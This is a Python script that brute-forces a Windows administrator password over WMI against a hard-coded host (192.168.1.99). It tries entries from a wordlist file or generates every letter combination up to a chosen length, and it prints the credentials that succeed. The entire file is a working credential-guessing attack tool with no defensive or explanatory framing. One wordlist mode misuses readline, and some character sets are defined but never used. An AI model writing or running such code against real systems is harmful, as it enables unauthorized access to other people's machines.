import wmi
import sys
import time
import itertools

def con(ip,user,password):
    try:
        conn=wmi.WMI(computer=ip,user=user,password=password)
        for sys in conn.Win32_OperatingSystem():
            #print("Connected!")
            print("IP:{}, User:{}, Password:{}".format(ip,user,password))
            #print(str(sys.Caption.encode("utf-8")))
            #print(sys.OSArchitecture.encode("utf-8"))
            #print(sys.NumberOfProcesses)
            return(True)
    except Exception as ex:
        print(ex)
        return(False)


def read_in_chunks(filePath, chunk_size=1024*1024):
    """    Lazy function (generator) to read a file piece by piece.    
    Default chunk size: 1M    You can set your own chunk size     """    
    file_object = open(filePath)    
    while True:
        chunk_data = file_object.read(chunk_size)        
        if not chunk_data:            
            break        
        yield chunk_data
        

ip="192.168.1.99"
user="administrator"
password="password"

char=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
num={"0","1","2","3","4","5","6","7","8","9"}

simple_note={"!","@","#",".",",","?"}


if __name__=="__main__":

    if len(sys.argv)>1:
        if sys.argv[1]=="dict":
            with open("pass.txt","r") as p:
                pwd=p.readlines()
                #print(pwd)
                for i in pwd:
                    if "\n" in i:
                        i=i.replace("\n","")
                    #print(i)
                    if con(ip,user,i)==True:
                        break
                    else:
                        print("Wrong Password: {}".format(i))
        elif sys.argv[1]=="dict_mode2":
            with open("pass.txt","r") as p:
                i=0
                i=int(input("Start At Line(Must Be An Integer): "))
                
                while True:
                    print(i)
                    pwd=p.readline(i)
                    if "\n" in pwd:
                        pwd=pwd.replace("\n","")
                    if con(ip,user,pwd)==True:
                        break
                    else:
                        print("Wrong Password: {}".format(pwd))
                    i+=1
        elif sys.argv[1]=="live_gen":
            if len(sys.argv)>=3:
                maxlen=int(sys.argv[2])
            else:
                print("You may use argument live_gen with a number in the back next time as the length of password generated like 'live_gen 3' ")
                maxlen=int(input("LengthOfPassword: "))
            print("Program Start, there will be {} attmptions, and may use {} s to complete.".format(str(len(char)**maxlen),str(len(char)**maxlen/50)))
            input("Press Enter To Start...")
            a=itertools.product(char,repeat=maxlen)
            t1=time.time()
            for i in a:
                pwd=""
                for j in i:
                    pwd+=j
                #print(len(pwd))
                if con(ip,user,pwd)==True:
                    break
                else:
                    print("Wrong Password: {}".format(pwd))
            t2=time.time()
            print("Time Used: {} s.".format(str(t2-t1)))


        else:
            print("Wrong Argument!")
    else:
        print("Argument Required!")


            
